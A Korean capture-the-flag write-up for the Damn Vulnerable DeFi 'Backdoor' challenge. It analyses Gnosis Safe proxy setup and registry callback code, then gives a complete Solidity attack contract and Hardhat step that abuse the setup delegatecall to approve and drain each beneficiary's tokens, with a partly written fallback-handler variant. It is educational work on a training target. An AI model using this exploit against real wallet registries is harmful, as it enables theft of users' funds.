https://teberr.notion.site/Damn-Vulnerable-Defi-Backdoor-2948a8205a6348e7a9ed8c50361ae78d

# 문제 소개

![문제.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ed4d3026-eb19-4526-9821-1b3fec9e0ac4/%EB%AC%B8%EC%A0%9C.png)

문제 #11 - Backdoor

팀에서 팀원들이 안전한 지갑을 만드는 것을 장려하기 위해서 Gnosis Safe walltes 레지스트리를 deploy 했습니다. 팀원 중에 누군가 지갑을 deploy 하고 등록하면 10DVT 토큰을 얻게 했습니다.

모든 것이 안전한지 검사하고 보장하기 위해서 레지스트리는 합법적인 Gnosis Safe Proxy Factory와 연결되어 있고 추가적인 보안 검사가 있습니다.

현재 지갑을 등록하고 10DVT 토큰을 받을 사람들은 Alice, Bob, Charlie, David로 총 4명입니다. 레지스트리는 현재 이 네명에게 배분해주기 위해 40DVT 토큰을 갖고 있습니다.

이번 단계의 목표는 레지스트리에 있는 40DVT 토큰을 탈취하는 것입니다.

Gnosis Safe wallets → **GnosisSafe.sol**

GnosisSafeProxyFactory → ****GnosisSafeProxyFactory.sol****

# 사전 지식

이 문제를 이해하기 위해서는 GnosisSafe 에 대한 이해가 필요한 것 같아 Gnosis-safe DOCS를 찾아보았다.

![다중 서명 지갑.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/72974e27-b418-440f-81ef-09515cfaae3f/%EB%8B%A4%EC%A4%91_%EC%84%9C%EB%AA%85_%EC%A7%80%EA%B0%91.png)

Gnosis Safe의 개념은 하나의 공용 금고(Safe)를 만들고 다중 서명을 통하여 여러명이 관리하고 사용할 수 있게 해주는 지갑이다. 이 Gnosis Safe에는 특징이 있는데 트랜잭션을 컨펌하기 위해서 그 공용 금고의 멤버들 중 지정된 threshlod 수 만큼이 컨펌해야 트랜잭션이 수행된다. 

GnosisSafe.sol 컨트랙트는 트랜잭션을 설정하고 수행하는데 필요한 핵심 기능들(ETH,ERC20,NFT와 같은 자금 보유 및 이체)를 가지고 있고

GnosisSafeProxy.sol 과 GnosisSafeProxyFactory.sol 은 컨트랙트를 배포할 때 비용이 많이들어 비용을 아끼기 위해 사용하는 컨트랙트이다. GnosisSafe는 컨트랙트를 업데이트하고 비용을 줄일 수 있도록 ‘**프록시 패턴**’을 사용한다. ProxyFactory는 새로운 safe(금고)를 만들고 프록시와 연결하는데 사용한다.

프록시 패턴이 무엇인지 생소하여 [https://blog.openzeppelin.com/proxy-patterns/](https://blog.openzeppelin.com/proxy-patterns/) 을 찾아보았다.

![프록시패턴.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/4a4a92f4-bd23-45ba-ba8c-6d49913cb321/%ED%94%84%EB%A1%9D%EC%8B%9C%ED%8C%A8%ED%84%B4.png)

프록시 패턴은 스마트 컨트랙트가 deploy된 후에 소스 코드를 수정할 수 없다는 단점을 보완하기 위해서 기본 로직이 업데이트 된 것처럼 새로운 컨트랙트로 연결해서 사용할 수 있도록 하는 방식이다. (delegatecall을 생각하면 될듯) 

이렇게 구성하게 되면 기존 로직 컨트랙트에서 변경할 점이 생겼을 때 새로운 로직 컨트랙트를 deploy하고 그 컨트랙트로 연결만 해주면 되기에 소스 코드를 업데이트한 효과를 얻을 수 있다.

이러한 방식을 사용할 때 두 가지 알아둬야 하는 점이 있다.

- 지원하지 않는 컨트랙트를 호출하는 경우 fallback 함수가 호출된다. 따라서 사용자 정의 fallback 함수를 작성하여 지원하지 않는 컨트랙트를 호출하는 경우에 상황을 대처할 수 있다. 그래서 프록시 컨트랙트에서는 구현된 다른 컨트랙트로 리다이렉트 시켜주기 위해 fallback 함수를 사용한다.
- delegatecall을 이용하여 호출하게 되면 msg.sender나 msg.value와 같은 값들이 유지가 된다.

GnosisSafe 지갑 구조를 알고 가자.

![GnosisSafe구조.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c46d63d7-4833-427a-b19b-61966cf77b37/GnosisSafe%EA%B5%AC%EC%A1%B0.png)

- 기존 로직 컨트랙트인 GnosisSafe를 업데이트할 일이 있을 경우 새로운 Logic Contract만 배포하여 연결하면 소스코드를 업데이트한 효과를 얻을 수 있음.
- Delegatecall을 사용하여 Proxy 컨트랙트에서 Logic Contract의 함수들을 실행 가능
- 지원하지 않는 컨트랙트를 호출할 경우 fallback 함수가 호출되어 사용자 정의 fallgack 함수를 통해 대처

# 초기 세팅

```tsx
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
        users = [alice.address, bob.address, charlie.address, david.address]

        // Deploy Gnosis Safe master copy and factory contracts
        this.masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
        this.walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        
        // Deploy the registry
        this.walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
            this.masterCopy.address,
            this.walletFactory.address,
            this.token.address,
            users
        );

        // Users are registered as beneficiaries
        for (let i = 0; i < users.length; i++) {
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.true;            
        }

        // Transfer tokens to be distributed to the registry
        await this.token.transfer(this.walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
    });
```

masterCopy = GnosisSafe 컨트랙트

walletFactory = GnosisSafeProxyFactory 컨트랙트

WalletRegistry에는 40DVT 토큰이 존재하며 alice,bob,charlie,david 주소에 대해 각각 beneficiaries 는 true로 매핑되어있다.

# Exploit 성공 조건

```solidity
after(async function () {
        /** SUCCESS CONDITIONS */
        for (let i = 0; i < users.length; i++) {
            let wallet = await this.walletRegistry.wallets(users[i]);
            
            // User must have registered a wallet
            expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet");

            // User is no longer registered as a beneficiary
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.false;
        }

        // Attacker must have taken all tokens
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
    });
```

1. Alice, Bob, Charlie, David의 지갑이 등록되어 있어야 한다.
2. Alice, Bob, Charlie, David는 더이상 10DVT 토큰을 받을 대상인 beneficiaries가 아니어야 한다.
3. 공격자의 주소에 분배될 40DVT 토큰을 전부 탈취하여 갖고 있어야 한다.

# 코드 분석 및 공격 설계

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

/**
 * @title WalletRegistry
 * @notice A registry for Gnosis Safe wallets.
	When known beneficiaries deploy and register their wallets, the registry sends some Damn Valuable Tokens to the wallet.
 * @dev The registry has embedded verifications to ensure only legitimate Gnosis Safe wallets are stored.
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract WalletRegistry is IProxyCreationCallback, Ownable {
    
    uint256 private constant MAX_OWNERS = 1;
    uint256 private constant MAX_THRESHOLD = 1;
    uint256 private constant TOKEN_PAYMENT = 10 ether; // 10 * 10 ** 18
    
    address public immutable masterCopy;
    address public immutable walletFactory;
    IERC20 public immutable token;

    mapping (address => bool) public beneficiaries;

    // owner => wallet
    mapping (address => address) public wallets;

    constructor(
        address masterCopyAddress,
        address walletFactoryAddress, 
        address tokenAddress,
        address[] memory initialBeneficiaries
    ) {
        require(masterCopyAddress != address(0));
        require(walletFactoryAddress != address(0));

        masterCopy = masterCopyAddress;
        walletFactory = walletFactoryAddress;
        token = IERC20(tokenAddress);

        for (uint256 i = 0; i < initialBeneficiaries.length; i++) {
            addBeneficiary(initialBeneficiaries[i]);
        }
    }

    function addBeneficiary(address beneficiary) public onlyOwner {
        beneficiaries[beneficiary] = true;
    }

    function _removeBeneficiary(address beneficiary) private {
        beneficiaries[beneficiary] = false;
    }

    /**
     @notice Function executed when user creates a Gnosis Safe wallet via GnosisSafeProxyFactory::createProxyWithCallback
             setting the registry's address as the callback.
     */
    function proxyCreated(
        GnosisSafeProxy proxy,
        address singleton,
        bytes calldata initializer,
        uint256
    ) external override {
        // Make sure we have enough DVT to pay
        require(token.balanceOf(address(this)) >= TOKEN_PAYMENT, "Not enough funds to pay");

        address payable walletAddress = payable(proxy);

        // Ensure correct factory and master copy
        require(msg.sender == walletFactory, "Caller must be factory");
        require(singleton == masterCopy, "Fake mastercopy used");
        
        // Ensure initial calldata was a call to `GnosisSafe::setup`
        require(bytes4(initializer[:4]) == GnosisSafe.setup.selector, "Wrong initialization");

        // Ensure wallet initialization is the expected
        require(GnosisSafe(walletAddress).getThreshold() == MAX_THRESHOLD, "Invalid threshold");
        require(GnosisSafe(walletAddress).getOwners().length == MAX_OWNERS, "Invalid number of owners");       

        // Ensure the owner is a registered beneficiary
        address walletOwner = GnosisSafe(walletAddress).getOwners()[0];

        require(beneficiaries[walletOwner], "Owner is not registered as beneficiary");

        // Remove owner as beneficiary
        _removeBeneficiary(walletOwner);

        // Register the wallet under the owner's address
        wallets[walletOwner] = walletAddress;

        // Pay tokens to the newly created wallet
        token.transfer(walletAddress, TOKEN_PAYMENT);        
    }
}
```

이 컨트랙트의 목적은 beneficiaries에 등록된 주소가 true로 매핑되어 있는 사람이 지갑을 등록하면 10DVT 토큰을 보내도록 하는 것이다.

먼저 생성자를 살펴보자.

```solidity
constructor(
        address masterCopyAddress,
        address walletFactoryAddress, 
        address tokenAddress,
        address[] memory initialBeneficiaries
    ) {
        require(masterCopyAddress != address(0));
        require(walletFactoryAddress != address(0));

        masterCopy = masterCopyAddress;
        walletFactory = walletFactoryAddress;
        token = IERC20(tokenAddress);

        for (uint256 i = 0; i < initialBeneficiaries.length; i++) {
            addBeneficiary(initialBeneficiaries[i]);
        }
    }
```

masterCopy 주소, walletFactory 주소,  token(DVT토큰)주소를 초기화해주고 전달받은 주소들에 대하여 10DVT를 받을 대상으로 해준다. 

```solidity
    function addBeneficiary(address beneficiary) public onlyOwner {
        beneficiaries[beneficiary] = true;
    }

    function _removeBeneficiary(address beneficiary) private {
        beneficiaries[beneficiary] = false;
    }
```

10DVT 토큰을 받을 대상이 되려면 beneficiaries 에서 지갑 주소에 매핑된 값이 true여야 하는데 이 값을 조정해주는 함수이다. 

이 때 beneficiaries에 추가해 주는 것은 Owner만 가능하도록 모디파이어를 설정해 주고 있고 beneficiaries에서 제거해주는 것은 private으로 되어 외부에서 호출이 안된다.

```solidity
 /**
     @notice Function executed when user creates a Gnosis Safe wallet via GnosisSafeProxyFactory::createProxyWithCallback
             setting the registry's address as the callback.
     */
    function proxyCreated(
        GnosisSafeProxy proxy,
        address singleton,
        bytes calldata initializer,
        uint256
    ) external override {
        // Make sure we have enough DVT to pay
        require(token.balanceOf(address(this)) >= TOKEN_PAYMENT, "Not enough funds to pay");

        address payable walletAddress = payable(proxy);

        // Ensure correct factory and master copy
        require(msg.sender == walletFactory, "Caller must be factory");
        require(singleton == masterCopy, "Fake mastercopy used");
        
        // Ensure initial calldata was a call to `GnosisSafe::setup`
        require(bytes4(initializer[:4]) == GnosisSafe.setup.selector, "Wrong initialization");

        // Ensure wallet initialization is the expected
        require(GnosisSafe(walletAddress).getThreshold() == MAX_THRESHOLD, "Invalid threshold");
        require(GnosisSafe(walletAddress).getOwners().length == MAX_OWNERS, "Invalid number of owners");       

        // Ensure the owner is a registered beneficiary
        address walletOwner = GnosisSafe(walletAddress).getOwners()[0];

        require(beneficiaries[walletOwner], "Owner is not registered as beneficiary");

        // Remove owner as beneficiary
        _removeBeneficiary(walletOwner);

        // Register the wallet under the owner's address
        wallets[walletOwner] = walletAddress;

        // Pay tokens to the newly created wallet
        token.transfer(walletAddress, TOKEN_PAYMENT);        
    }
```

proxyCreated 함수는 IProxyCreationCallback을 오버라이드한 함수로 유저가 GnosisSafeProxyFactory의 CreateProxyWithCallback 함수를 이용하여 Gnosis Safe Wallet을 생성했을 때 실행되는 콜백 함수이다.

1. 이 컨트랙트에 10DVT 토큰보다 많이 있어야 한다.
2. walletAddress는 프록시의 주소이다.
3. 이 함수를 호출한 msg.sender는 walletfactory(GnosisSafeProxyFactory 컨트랙트)여야 한다.
4. 두번째 인자로 전달된 singleton은 masterCopy(Gnosis 컨트랙트)여야 한다.
5. bytes 배열인 initializer의 index4까지의 값이 GnosisSafe.setup.selector(setup 함수의 시그니쳐)여야 한다.
6. GnosisSafe 지갑(walletAddress)의 Threshold는 1이여야한다.
7. GnosisSafe 지갑(walletAddress)의 주인은 1명이어야 한다.
8. GnosisSafe 지갑의 walletOwner중 첫번째 주소를 가져온다.
9. 이 첫번째 주소는 beneficiaries에 매핑된 값이 true여야 한다.
10. beneficiary에서 제거하고 wallets의 walletOwner와 walletAddress(프록시 주소)를 매핑한다.
11. DVT 토큰을 이 컨트랙트에서 walletAddress(프록시의 주소)로 보낸다.

이 함수를 실행시키는 GnosisSafeProxyFactory 컨트랙트의 CreateProxyWithCallback 함수를 보자.

```solidity
		/// @dev Allows to create new proxy contact, execute a message call to the new proxy and call a specified callback within one transaction
    /// @param _singleton Address of singleton contract.
    /// @param initializer Payload for message call sent to new proxy contract.
    /// @param saltNonce Nonce that will be used to generate the salt to calculate the address of the new proxy contract.
    /// @param callback Callback that will be invoked after the new proxy contract has been successfully deployed and initialized.
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) public returns (GnosisSafeProxy proxy) {
        uint256 saltNonceWithCallback = uint256(keccak256(abi.encodePacked(saltNonce, callback)));
        proxy = createProxyWithNonce(_singleton, initializer, saltNonceWithCallback);
        if (address(callback) != address(0)) callback.proxyCreated(proxy, _singleton, initializer, saltNonce);
    }
```

CreateProxyWithCallback 함수는 새로운 프록시 컨트랙트를 만들고 이 프록시에 대해 message call을 실행하여 특정한 콜백 함수를 실행하는 것이다.

1. singleton은 컨트랙트의 주소 (singleton은 인스턴스가 하나만 생성되는 컨트랙트를 의미)
2. initializer는 새로운 프록시 컨트랙트에게 보내는 message call 페이로드 
3. saltNonce는 새로운 프록시 컨트랙트의 주소를 계산하기 위해 생성하는 salt값
4. 새로운 프록시 컨트랙트가 성공적으로 deploy되고 초기화 된 후에 호출되는 콜백함수

즉 ProxyFactory의 createProxyWithCallback이 문제 컨트랙트의 proxyCreated를 호출한다고 하였으므로 callback 파라미터는 문제 컨트랙트의 주소가 된다.

프록시 컨트랙트는 Storage 계층이므로 다중 지갑 계정들이 존재한다. 이 곳에 초기화되는 값이 어떤 값이냐에 따라서 다중 지갑 계정의 초기값이 결정된다. 그렇다면 내가 임의의 proxy 컨트랙트를 만들고 그 proxy 컨트랙트에 DVT 토큰을 받야아하는 alice, bob, charlie, david 가 각각 다중 지갑 계정이 있다면 proxy 컨트랙트로 DVT 토큰이 전송되게 된다.

그렇다면 initializer는 어떤 값들이 들어가야 할까? CreateProxyWithCallback 함수에서 인자로 받은 initializer는 다시 CreateProxyWithNonce를 호출하는데 사용하므로 CreateProxyWithNonce를 확인해보았다.

 

```solidity
		/// @dev Allows to create new proxy contact and execute a message call to the new proxy within one transaction.
    /// @param _singleton Address of singleton contract.
    /// @param initializer Payload for message call sent to new proxy contract.
    /// @param saltNonce Nonce that will be used to generate the salt to calculate the address of the new proxy contract.
    function createProxyWithNonce(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce
    ) public returns (GnosisSafeProxy proxy) {
        proxy = deployProxyWithNonce(_singleton, initializer, saltNonce);
        if (initializer.length > 0)
            // solhint-disable-next-line no-inline-assembly
            assembly {
                if eq(call(gas(), proxy, 0, add(initializer, 0x20), mload(initializer), 0, 0), 0) {
                    revert(0, 0)
                }
            }
        emit ProxyCreation(proxy, _singleton);
    }
```

여기서 solidity assembly 에 initializer는 assembly로 call함수가 실행되는 것을 볼 수 있다. assembly call과 add, mload을 docs에서 찾아보면 아래와 같다.

- call(g, a, v, in, insize, out, outsize)
    
    **`CALL(g, a, v, in, insize, out, outsize)`**: 다른 컨트랙의 함수를 호출. 
    **`a`**는 대상 어카운트 주소
    **`g`**는 가스량
    **`v`**는 `msg.value` 
    **`in`**은 `msg.data`값의 메모리상의 위치 
    **`insize`**는 해당 인풋의 길이입니다. 
    **메모리의 `in, ..., in + insize — 1` 위치의 값**이 인풋(`msg.data`)으로 사용 
    만약 위 함수가 값을 반환한다면 메모리의 `out, ..., out + outsize — 1` 에 해당 반환값을 저장
    호출에 성공하면1, 실패하면 0을 반환한다.
    
- add(x,y)
    
    x와 y를 더해준다.
    
- molad(p)
    
    메모리의 p위치에 있는 32바이트를 읽어들임.
    

즉 createProxyWithNonce는 다음과 같이 진행된다.

새로운 proxy를 deploy하고 proxy에서 initializer에 0x20을 더한 위치에 있는 데이터를 initializer의 길이만큼 읽어들여 실행시켜 주는 것을 볼 수 있다. 즉 initializer에 원하는 함수를 abi.encodeWithSignature로 전달하면 실행시킬 수 있음을 확인했다.

하지만 문제 컨트랙트에서 확인했을 때 initializer의 첫 4바이트는 GnosisSafe의 setup 함수여야만 한다. 그렇다면 setup 함수에서 원하는 함수를 실행시킬 수 있을지 확인해봐야한다.

```solidity
function setup(
        address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address payable paymentReceiver
    ) external {
        // setupOwners checks if the Threshold is already set, therefore preventing that this method is called twice
        setupOwners(_owners, _threshold);
        if (fallbackHandler != address(0)) internalSetFallbackHandler(fallbackHandler);
        // As setupOwners can only be called if the contract has not been initialized we don't need a check for setupModules
        setupModules(to, data);

        if (payment > 0) {
            // To avoid running into issues with EIP-170 we reuse the handlePayment function (to avoid adjusting code of that has been verified we do not adjust the method itself)
            // baseGas = 0, gasPrice = 1 and gas = payment => amount = (payment + 0) * 1 = payment
            handlePayment(payment, 0, 1, paymentToken, paymentReceiver);
        }
        emit SafeSetup(msg.sender, _owners, _threshold, to, fallbackHandler);
    }
```

GnosisSafe의 setup함수는 컨트랙트의 초기 스토리지를 설정하는 내용이다.

1. _owners는 다중 지갑의 주인들이다.
2. threshold는 다중 지갑에서 트랜잭션을 보내기 위해서 confirm해야 하는 주인들의 수이다.
3. optional delegatecall을 위하여 필요한 컨트랙트 주소이다.(address to)
4. optional delegatecall에서 사용할 데이터 페이로드이다. (bytes calldata data)
5. 이 컨트랙트의 fallback 호출을 위해 사용하는 주소이다.(fallbackHandler)
6. 지불을 위해 사용하는 토큰이다. (0은 ETH를 의미)
7. 지불해야 할 값이다.(payment)
8. 지불을 받을 주소이다 0은 tx.origin을 의미한다.(paymentReceiver)

여기서 문제를 해결하는 방법은 두가지 방법이 있다.

1. delegatecall을 사용하여 해결하는 방법
2. fallback 함수를 이용하여 해결하는 방법

둘 다 살펴보자.

# delegatecall을 사용하여 해결

[https://github.com/safe-global/safe-contracts/blob/v1.3.0/contracts/base/ModuleManager.sol](https://github.com/safe-global/safe-contracts/blob/v1.3.0/contracts/base/ModuleManager.sol)

setupModules 함수는 Modulemanager.sol에 존재한다.

```solidity
function setupModules(address to, bytes memory data) internal {
        require(modules[SENTINEL_MODULES] == address(0), "GS100");
        modules[SENTINEL_MODULES] = SENTINEL_MODULES;
        if (to != address(0))
            // Setup has to complete successfully or transaction fails.
            require(execute(to, 0, data, Enum.Operation.DelegateCall, gasleft()), "GS000");
    }
```

이 함수는 인자로 받은 to와 data를 이용해 execute 함수를 실행하는 함수이다.

이 execute 함수는 Executor.sol 에 존재한다.

```solidity
// SPDX-License-Identifier: LGPL-3.0-only
pragma solidity >=0.7.0 <0.9.0;
import "../common/Enum.sol";

/// @title Executor - A contract that can execute transactions
/// @author Richard Meissner - <richard@gnosis.pm>
contract Executor {
    function execute(
        address to,
        uint256 value,
        bytes memory data,
        Enum.Operation operation,
        uint256 txGas
    ) internal returns (bool success) {
        if (operation == Enum.Operation.DelegateCall) {
            // solhint-disable-next-line no-inline-assembly
            assembly {
                success := delegatecall(txGas, to, add(data, 0x20), mload(data), 0, 0)
            }
        } else {
            // solhint-disable-next-line no-inline-assembly
            assembly {
                success := call(txGas, to, value, add(data, 0x20), mload(data), 0, 0)
            }
        }
    }
}
```

[https://github.com/safe-global/safe-contracts/blob/v1.3.0/contracts/base/Executor.sol](https://github.com/safe-global/safe-contracts/blob/v1.3.0/contracts/base/Executor.sol)

이 함수는 인자로 받은 to와 data를 기반으로 delegatecall을 호출하는 것을 확인할 수 있다.

이 때도 마찬가지로 data는 동적인 자료형이므로 초기 32바이트는 data의 크기를 의미하며 실질적인 data가 저장되어 있는 data+32바이트 위치부터 실행하는 것을 볼 수 있다.

따라서 공격 설계는 다음과 같이 이루어진다.

![delegatecall 공격설계.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/88c1fbd3-35b2-4d71-9fba-0c6e67382420/delegatecall_%EA%B3%B5%EA%B2%A9%EC%84%A4%EA%B3%84.png)

1. Attacker Contract에서 DVT 토큰을 approve 하는 함수를 만든다.
2. Setup 함수의 인자 중 to를 attacker의 컨트랙트, data를 DVT 토큰을 approve 하는 함수로 설정한다.
3. 각  Alice, Bob, Charlie, David에 대해 Proxy를 생성하게 하며 callback 함수로 각 Proxy에 10DVT가 저장되게 된다.
4. approve를 통해 이 DVT를 가져올 권한이 있으므로 컨트랙트로 가져온 후 attacker의 주소로 보낸다.

이를 위해 공격 컨트랙트를 작성했다.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "../DamnValuableToken.sol";

interface IGnosisSafeProxyFactory{
     function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

contract attackBackdoor_del{
    IGnosisSafeProxyFactory public factory;
    DamnValuableToken public immutable token; 
    address public masterCopy;
    IProxyCreationCallback public WalletRegistry;
    address public attacker;
    
    constructor(address _factory,address _mastercopy,address _token,address _WalletRegistry){
        factory= IGnosisSafeProxyFactory(_factory);
        masterCopy=_mastercopy;
        token=DamnValuableToken(_token);
        WalletRegistry=IProxyCreationCallback(_WalletRegistry);
        attacker=msg.sender;
    }

    function approve(address _addr) public {
        token.approve( _addr , 10 ether);
    }

    function exploit(address[] calldata users)public{
        for(uint256 i=0;i<users.length;i++){
            address[] memory target = new address[](1);
            target[0]=users[i];

            bytes memory code = abi.encodeWithSignature("approve(address)",address(this));

            bytes memory initializer = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)",
            target, // owner
            uint256(1), // threshold
            address(this), // delegatecall을 위한 주소 to
            code, // delegatecall을 할 data
            address(0), // fallbackHandler 는 없어야하므로 0
            address(0), // 0은 ETH
            uint256(0), // 지불 금액
            address(0) // 지불 받을 주소
            );
            GnosisSafeProxy proxy = factory.createProxyWithCallback(masterCopy, initializer, 11, WalletRegistry);
            token.transferFrom(address(proxy),address(this),10 ether);
        }

        token.transfer(attacker,40 ether);
    }
    
}
```

DelegateCall을 사용할 때 (Proxy 패턴)일 때 유의해야 할 점이 있다.

[https://stackoverflow.com/questions/70971068/issues-using-a-delegatecall-proxy-contract-with-solidity-and-using-variables-i](https://stackoverflow.com/questions/70971068/issues-using-a-delegatecall-proxy-contract-with-solidity-and-using-variables-i) 에서 알 수 있듯이 프록시(storage 컨트랙트)에서 로직 컨트랙트의 변수를 읽고 사용할 수 있으려면 immutable이나 constant로 선언해야 한다. 

initializer는 setup 함수를 호출하는 것이므로 setup 함수의 delegatecall 옵션에서 이 컨트랙트의 주소를 인자로 토큰의 approve 함수를 호출하게 하여 이 컨트랙트에서 DVT 토큰을 가져올 수 있게 하였다. 이 때 token을 immutable로 선언하지 않으면 delegatecall 시에 token에 저장된 값이 없게 되므로 immutable로 선언해주어야 한다.

```tsx
const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Backdoor', function () {
    let deployer, users, attacker;

    const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther('40');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
        users = [alice.address, bob.address, charlie.address, david.address]

        // Deploy Gnosis Safe master copy and factory contracts
        this.masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
        this.walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        
        // Deploy the registry
        this.walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
            this.masterCopy.address,
            this.walletFactory.address,
            this.token.address,
            users
        );

        // Users are registered as beneficiaries
        for (let i = 0; i < users.length; i++) {
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.true;            
        }

        // Transfer tokens to be distributed to the registry
        await this.token.transfer(this.walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        for (let i = 0; i < users.length; i++) {
            let wallet = await this.walletRegistry.wallets(users[i]);
            
            // User must have registered a wallet
            expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet");

            // User is no longer registered as a beneficiary
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.false;
        }

        // Attacker must have taken all tokens
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
    });
});
```

test 폴더의 backdoor.challenge.js의 Exploit 부분에서 작성한 컨트랙트를 배포 후 exploit 함수를 실행해 주면 된다.

```tsx
it('Exploit', async function () {
        this.attackFactory = await ethers.getContractFactory("attackBackdoor_del",attacker);
        this.attackcontract = await this.attackFactory.deploy( this.walletFactory.address, this.masterCopy.address, this.token.address, this.walletRegistry.address);
        await this.attackcontract.connect(attacker).exploit(users);

    });
```

![성공_del.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/01d0764f-b027-4ae3-a0f1-79c7df26cee2/%EC%84%B1%EA%B3%B5_del.png)

npm run backdoor를 통하여 Exploit이 성공적으로 진행되어 문제의 목표를 달성한 것을 확인할 수 있다.

## Fallback 함수를 사용하여 해결

fallbackHandler주소가 0이 아닐때 이를 인자로 internalSetFallbackHandler를 호출하는 것을 볼 수 있다.

internalSetFallbackHandler는 FallBackManager.sol 함수에 존재한다.

```solidity
// SPDX-License-Identifier: LGPL-3.0-only
pragma solidity >=0.7.0 <0.9.0;

import "../common/SelfAuthorized.sol";

/// @title Fallback Manager - A contract that manages fallback calls made to this contract
/// @author Richard Meissner - <richard@gnosis.pm>
contract FallbackManager is SelfAuthorized {
    event ChangedFallbackHandler(address handler);

    // keccak256("fallback_manager.handler.address")
    bytes32 internal constant FALLBACK_HANDLER_STORAGE_SLOT = 0x6c9a6c4a39284e37ed1cf53d337577d14212a4870fb976a4366c693b939918d5;

    function internalSetFallbackHandler(address handler) internal {
        bytes32 slot = FALLBACK_HANDLER_STORAGE_SLOT;
        // solhint-disable-next-line no-inline-assembly
        assembly {
            sstore(slot, handler)
        }
    }

    /// @dev Allows to add a contract to handle fallback calls.
    ///      Only fallback calls without value and with data will be forwarded.
    ///      This can only be done via a Safe transaction.
    /// @param handler contract to handle fallbacks calls.
    function setFallbackHandler(address handler) public authorized {
        internalSetFallbackHandler(handler);
        emit ChangedFallbackHandler(handler);
    }

    // solhint-disable-next-line payable-fallback,no-complex-fallback
    fallback() external {
        bytes32 slot = FALLBACK_HANDLER_STORAGE_SLOT;
        // solhint-disable-next-line no-inline-assembly
        assembly {
            let handler := sload(slot)
            if iszero(handler) {
                return(0, 0)
            }
            calldatacopy(0, 0, calldatasize())
            // The msg.sender address is shifted to the left by 12 bytes to remove the padding
            // Then the address without padding is stored right after the calldata
            mstore(calldatasize(), shl(96, caller()))
            // Add 20 bytes for the address appended add the end
            let success := call(gas(), handler, 0, 0, add(calldatasize(), 20), 0, 0)
            returndatacopy(0, 0, returndatasize())
            if iszero(success) {
                revert(0, returndatasize())
            }
            return(0, returndatasize())
        }
    }
}
```

- mstore(p,v)
    
    메모리의 p위치에 v를 저장
    
- calldatacopy(t, f, s)
    
    f번째 위치에서 s바이트만큼 메모리의 t번째 위치에 저장
    
     
    
- calldatasize()
    
    [msg.data](http://msg.data)의 크기를 반환한다.
    
- caller
    
    함수를 호출한 주소 = msg.sender (delegatecall 제외)
    
- call(g, a, v, in, insize, out, outsize)
    
    **`CALL(g, a, v, in, insize, out, outsize)`**: 다른 컨트랙의 함수를 호출. 
    **`g`**는 가스량
    
    **`a`**는 대상 어카운트 주소
    **`v`**는 `msg.value` 
    **`in`**은 `msg.data`값의 메모리상의 위치 
    **`insize`**는 해당 인풋의 길이입니다. 
    **메모리의 `in, ..., in + insize — 1` 위치의 값**이 인풋(`msg.data`)으로 사용 
    만약 위 함수가 값을 반환한다면 메모리의 `out, ..., out + outsize — 1` 에 해당 반환값을 저장
    호출에 성공하면1, 실패하면 0을 반환한다.
    

internalSetFallbackHandler 에서는 slot에 전달받은 핸들러의 주소를 저장하는 것을 볼 수 있다.

slot에서 저장해 두었던 핸들러의 주소를 가져와 그 핸들러에서 전달받은 함수를 실행하게 된다. 따라서 핸들러에 원하는 주소를 넣은 후 그 핸들러에서 원하는 함수를 실행시킬 수 있다. 

